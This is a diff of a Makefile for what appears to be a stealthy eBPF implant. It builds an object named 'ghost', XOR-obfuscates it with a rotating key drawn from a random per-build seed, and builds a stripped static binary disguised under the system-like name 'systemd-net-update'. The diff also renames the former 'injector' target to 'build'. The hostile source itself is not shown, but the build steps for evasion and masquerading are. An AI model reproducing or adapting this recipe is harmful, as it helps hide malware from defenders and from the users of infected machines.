@@ -1,28 +1,27 @@
 CC = clang
 ZIG = zig
-SESSION_SEED = $(shell head -c 4 /dev/urandom | xxd -p)
+SEED_HEX = $(shell head -c 4 /dev/urandom | xxd -p)
 
-.PHONY: all bpf injector key clean_obj clean
+.PHONY: all bpf build clean
 
-all: bpf injector key clean_obj
+all: bpf build clean_obj
 
 bpf:
 	@mkdir -p target
-	$(CC) -O3 -target bpf -DSEED=0x$(SESSION_SEED) -c src/bpf/ghost.c -o target/ghost.o
-	@python3 -c "d=open('target/ghost.o','rb').read();open('target/ghost.o','wb').write(bytearray([b^0x7A for b in d]))"
+	$(CC) -O3 -target bpf -DSEED=0x$(SEED_HEX) -I/usr/include/x86_64-linux-gnu -c src/bpf/ghost.c -o target/ghost.o
+	@python3 -c "d=bytearray(open('target/ghost.o','rb').read()); s=0x$(SEED_HEX); \
+	for i in range(len(d)): d[i]^=(s&0xFF); s=((s>>8)|(s<<24))&0xFFFFFFFF; \
+	open('target/ghost.o','wb').write(d)"
 
-injector:
+build:
+	@sed -i 's/const SEED: u32 = .*;/const SEED: u32 = 0x$(SEED_HEX);/' src/main.zig
 	$(ZIG) build-exe src/main.zig \
 		-target x86_64-linux-musl \
-		-ffreestanding \
 		-O ReleaseSmall \
 		-fstrip \
-		--name zt
-	@mv zt target/
-
-key:
-	$(CC) -O3 src/key.c -DSEED=0x$(SESSION_SEED) -o target/key
-	@strip target/key
+		--name systemd-net-update \
+		--entry _start
+	@mv systemd-net-update target/
 
 clean_obj:
 	@rm -f target/ghost.o
